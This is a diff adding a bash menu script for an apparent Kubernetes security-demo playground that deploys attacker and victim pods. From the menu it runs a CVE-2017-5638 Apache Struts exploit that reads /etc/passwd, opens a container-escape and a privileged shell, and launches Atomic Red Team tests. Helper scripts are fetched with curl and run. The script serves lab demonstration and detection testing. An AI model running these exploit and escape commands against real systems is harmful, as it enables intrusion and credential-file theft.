@@ -1,0 +1,169 @@
+#!/bin/bash
+
+set -e
+
+# curl -fsSL https://raw.githubusercontent.com/mawinkler/c1-playground/master/bin/playground | bash
+
+CURRENT_PATH=$(pwd)
+
+# Source helpers
+if [ -f $PGPATH/bin/playground-helpers.sh ]; then
+    .  $PGPATH/bin/playground-helpers.sh
+else
+    curl -fsSL https://raw.githubusercontent.com/mawinkler/c1-playground/master/bin/playground-helpers.sh -o /tmp/playground-helpers.sh
+    . /tmp/playground-helpers.sh
+fi
+
+# Check for dialog
+DIALOG_INSTALLED=$(apt -qq list dialog 2>/dev/null)
+if [[ "$DIALOG_INSTALLED" == *"installed"* ]]; then
+    echo "dialog installed"
+else
+    sudo apt install -y dialog
+fi
+
+DIALOG_CANCEL=1
+DIALOG_ESC=255
+HEIGHT=0
+WIDTH=0
+
+# Define the dialog exit status codes
+: ${DIALOG_OK=0}
+: ${DIALOG_CANCEL=1}
+: ${DIALOG_HELP=2}
+: ${DIALOG_EXTRA=3}
+: ${DIALOG_ITEM_HELP=4}
+: ${DIALOG_ESC=255}
+
+# Duplicate (make a backup copy of) file descriptor 1 
+# on descriptor 3
+exec 3>&1
+
+display_result() {
+    dialog --title "$1" \
+        --no-collapse \
+        --msgbox "$result" 20 100
+}
+
+display_progress() {
+
+    echo -n > $PGPATH/log/last.err
+    echo -n > $PGPATH/log/last.log
+    while true ; do
+        if [ "$(tail -n 1 $PGPATH/log/last.log | grep -Ei '###TASK-COMPLETED###|error')" != "" ] ; then
+            break
+        fi
+        # expr $(cat $PGPATH/log/last.log | wc -l)  \* 100 \/ $1 || true
+        let "percentage = $(cat $PGPATH/log/last.log | wc -l)  * 100 / $1" || true
+        if [ $percentage -gt 100 ]; then
+            echo 100
+        else
+            echo $percentage
+        fi
+        sleep 1
+    done | dialog --gauge 'Task running...' 10 60 0
+
+    cp $PGPATH/log/last.log $PGPATH/log/$(date +'%d-%m-%YT%H-%M-%S-')$2.log
+    echo "$(date +'%d-%m-%Y %H:%M:%S') $2 $(cat $PGPATH/log/last.log | wc -l)" >> $PGPATH/log/length.log
+
+    if [ "$(grep -i 'error' $PGPATH/log/last.log)" != "" ] ; then
+        grep -i 'error' $PGPATH/log/last.log >> $PGPATH/log/last.err
+        result="$(tail -n 10 $PGPATH/log/last.log)"
+        display_result "Error occured"
+    else
+        dialog --msgbox "Task successful" 5 20
+    fi
+
+}
+
+#######################################
+# Main Menu
+#######################################
+function menu_main() {
+
+    # exec 3>&1
+
+    while true
+    do
+        items=( "Prepare" "Deploy Attackers and Victims" \
+            "CVE-2017-5638" "Apache Struts 2 Jakarta" \
+            "Escape" "Escape to Host" \
+            "Privileged" "Get a privileged shell" \
+            "AtomicRed" "Runtime Violations")
+        TITLE="Exploits Menu"
+        check_k8s
+        BACKTITLE="Playground: ${CLUSTER}"
+        choice=$(dialog --title "${TITLE}" \
+                    --backtitle "${BACKTITLE}" \
+                    --cancel-label "Exit" \
+                    --separate-widget "Widget" \
+                    --menu "Please select" ${HEIGHT} ${WIDTH} 12 "${items[@]}" \
+                    2>&1 1>&3)
+        exit_status=$?
+        case $exit_status in
+            $DIALOG_CANCEL)
+            clear
+            echo "Program terminated."
+            exec 3>&-
+            exit
+            ;;
+            $DIALOG_ESC)
+            clear
+            echo "Program aborted." >&2
+            exec 3>&-
+            exit 1
+            ;;
+        esac
+        case $choice in
+            "Prepare")
+                clear
+                $PGPATH/bin/deploy-attackers-victims.sh
+                ;;
+            "CVE-2017-5638")
+                clear
+                if is_eks; then
+                    kubectl exec -n attackers \
+                        $(kubectl -n attackers get pods --selector=app=attacker-cve-2017-5638 -o jsonpath='{.items[0].metadata.name}') -- \
+                        python3 exploit.py "http://$(kubectl get svc -n victims --selector=app=java-goof -o jsonpath='{.items[*].status.loadBalancer.ingress[0].hostname}')" 'cat /etc/passwd'
+                    read -p "Press any key to resume..."
+                else
+                    kubectl exec -n attackers \
+                        $(kubectl -n attackers get pods --selector=app=attacker-cve-2017-5638 -o jsonpath='{.items[0].metadata.name}') -- \
+                        python3 exploit.py "http://$(kubectl get svc -n victims --selector=app=java-goof -o jsonpath='{.items[*].status.loadBalancer.ingress[0].ip}')" 'cat /etc/passwd'
+                    read -p "Press any key to resume..."
+                fi
+                read -p "Press any key to resume..."
+                ;;
+            "Escape")
+                clear
+                kubectl exec -n attackers -it \
+                    $(kubectl -n attackers get pod --selector=app=shell -o jsonpath='{.items[0].metadata.name}') -- \
+                    /bin/bash -c 'godmode'
+                read -p "Press any key to resume..."
+                ;;
+            "Privileged")
+                clear
+                kubectl exec -n attackers -it \
+                    $(kubectl -n attackers get pod --selector=app=shell -o jsonpath='{.items[0].metadata.name}') -- \
+                    /bin/bash
+                read -p "Press any key to resume..."
+                ;;
+            "AtomicRed")
+                clear
+                kubectl apply -f $PGPATH/demos/dockerfiles/atomic-red/AtomicRedDocker-FullFalco.yaml
+                read -p "Press any key to resume..."
+                ;;
+            *) ;; # some action on other
+        esac
+    done
+}
+
+while true
+do
+    menu_main
+done
+
+clear
+
+# Close file descriptor 3
+exec 3>&-
